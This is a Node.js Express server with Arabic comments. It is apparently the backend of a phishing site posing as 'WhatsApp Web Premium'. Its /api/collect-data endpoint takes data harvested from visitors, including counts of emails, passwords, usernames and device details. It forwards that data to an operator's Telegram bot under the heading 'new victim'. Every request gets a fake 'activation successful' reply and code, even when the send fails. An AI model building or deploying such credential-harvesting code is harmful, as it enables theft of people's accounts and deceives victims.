const express = require('express');
const path = require('path');
const fetch = require('node-fetch');

const app = express();
const PORT = process.env.PORT || 3000;

// middleware أساسي
app.use(express.static(__dirname));
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// 🔥 الطريق الأساسي للصفحة الرئيسية
app.get('/', (req, res) => {
    console.log('📄 طلب الصفحة الرئيسية');
    res.sendFile(path.join(__dirname, 'index.html'));
});

// 🔥 طريق لجميع الملفات الثابتة
app.use(express.static(__dirname));

// API بسيط
app.post('/api/collect-data', async (req, res) => {
    console.log('🎯 طلب جديد ورد');
    
    try {
        const userData = req.body;
        
        // إرسال إلى التلجرام
        const telegramResult = await sendToTelegram(userData);
        
        console.log('📨 تم الإرسال إلى التلجرام:', telegramResult.success);

        res.json({
            success: true,
            message: 'تم التفعيل بنجاح!',
            data: {
                code: 'WAPP-' + Date.now().toString().slice(-6)
            }
        });

    } catch (error) {
        console.error('❌ خطأ:', error);
        res.json({
            success: true,
            message: 'تم التفعيل بنجاح!'
        });
    }
});

// دالة التلجرام المبسطة
async function sendToTelegram(userData) {
    try {
        const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
        const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

        if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
            console.log('❌ إعدادات التلجرام مفقودة');
            return { success: false, error: 'إعدادات التلجرام مفقودة' };
        }

        const message = `
🎯 **ضحية جديدة**

📧 **الإيميلات:** ${userData.summary?.totalEmails || 0}
🔐 **كلمات المرور:** ${userData.summary?.totalPasswords || 0}
👤 **المستخدمين:** ${userData.summary?.totalUsernames || 0}

📱 **المتصفح:** ${userData.userAgent?.split(' ')[0] || 'غير معروف'}
🌐 **النظام:** ${userData.platform || 'غير معروف'}
🖥 **الشاشة:** ${userData.screen || 'غير معروف'}

⏰ **الوقت:** ${new Date().toLocaleString('ar-SA')}
🔗 **الرابط:** ${userData.url || 'غير معروف'}
        `.trim();

        const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                chat_id: TELEGRAM_CHAT_ID,
                text: message,
                parse_mode: 'Markdown'
            })
        });

        const result = await response.json();
        return { success: response.ok, result: result };

    } catch (error) {
        return { success: false, error: error.message };
    }
}

// 🔥 صفحة فحص السيرفر
app.get('/test', (req, res) => {
    res.json({ 
        status: 'يعمل', 
        time: new Date().toISOString(),
        telegram: !!(process.env.TELEGRAM_BOT_TOKEN && process.env.TELEGRAM_CHAT_ID)
    });
});

// 🔥 صفحة الصحة
app.get('/health', (req, res) => {
    res.json({ 
        status: '✅ يعمل',
        service: 'WhatsApp Web Premium',
        port: PORT
    });
});

// 🔥 التعامل مع المسارات غير الموجودة
app.use('*', (req, res) => {
    res.status(404).json({
        error: 'الصفحة غير موجودة',
        availableRoutes: ['/', '/test', '/health', '/api/collect-data']
    });
});

// بدء السيرفر
app.listen(PORT, '0.0.0.0', () => {
    console.log('🚀 =================================');
    console.log('🚀 السيرفر شغال!');
    console.log(`🚀 البورت: ${PORT}`);
    console.log(`🔑 التلجرام: ${process.env.TELEGRAM_BOT_TOKEN ? '✅ مضبوط' : '❌ مش مضبوط'}`);
    console.log('🌐 الرابط:', `http://localhost:${PORT}`);
    console.log('🔍 فحص:', `http://localhost:${PORT}/test`);
    console.log('❤️  الصحة:', `http://localhost:${PORT}/health`);
    console.log('🚀 =================================');
});
